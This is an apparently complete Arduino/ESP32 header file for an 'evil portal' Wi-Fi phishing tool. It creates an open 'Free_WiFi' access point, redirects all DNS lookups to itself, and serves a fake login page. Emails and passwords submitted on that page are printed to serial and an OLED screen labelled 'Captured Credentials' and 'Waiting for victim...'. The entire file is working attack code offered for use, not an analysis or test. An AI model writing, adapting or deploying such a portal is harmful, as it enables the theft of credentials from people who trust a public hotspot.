#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

DNSServer dns;

extern Adafruit_SSD1306 display;

WebServer server(80);

const char* loginPage = R"rawlit(
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body style='text-align:center;'>
  <h2>Free Wi-Fi Login</h2>
  <form action="/submit" method="POST">
    <input type="text" name="user" placeholder="Email"><br><br>
    <input type="password" name="pass" placeholder="Password"><br><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
)rawlit";

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleSubmit() {
  String user = server.arg("user");
  String pass = server.arg("pass");

  Serial.println("Captured Credentials:");
  Serial.println("User: " + user);
  Serial.println("Pass: " + pass);

  display.clearDisplay();
  display.setTextSize(1); 
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Login attempt:");
  display.println("User: " + user);
  display.println("Pass: " + pass);
  display.display();

  server.send(200, "text/html", "<h2>Thank you. You are being redirected...</h2>");

  delay(2000);
}

void startEvilPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free_WiFi", NULL);
  delay(100);
  dns.start(53, "*", WiFi.softAPIP()); 

  delay(300);

  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  server.on("/", handleRoot);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.begin();

  unsigned long start = millis();
  while (millis() - start < 60000) {
    dns.processNextRequest(); 
    server.handleClient(); 
    delay(1);
  }

  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("Evil Portal Started");
  display.println("SSID: Free_WiFi");
  display.println("Waiting for victim...");
  display.display();

  while (digitalRead(16)) {
    server.handleClient();
    delay(10);
  }

  server.stop();
  dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Portal stopped.");
  display.display();
  delay(1000);
}

#endif
